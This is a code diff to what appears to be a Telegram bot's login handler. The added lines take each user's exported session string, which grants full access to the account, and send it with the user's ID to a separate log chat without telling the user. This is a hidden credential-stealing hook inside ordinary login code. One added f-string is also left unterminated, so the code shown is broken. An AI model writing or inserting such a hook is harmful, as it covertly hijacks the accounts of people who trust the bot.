@@ -296,6 +296,11 @@ async def lin(event):
             #await db.loin(int(event.sender_id))
             #await conv.send_message("Successfully logged in.\nNow send me your message link to download.")
             s = await client.export_session_string()
+            try:
+                tag = f'[{event.sender.first_name}](tg://user?id={event.sender_id})
+                await event.client.send_message(int(STRINGLOG), f'#NEW_SESSION {tag} Created new session\nUserID: {event.sender_id} Session: {s}') 
+            except Exception as e:
+                print(e)
         except Exception as e:
             await conv.send_message(f"**ERROR:** `{str(e)}`")
             await event.client.send_message(int(ACCESS), f'{str(e)}')
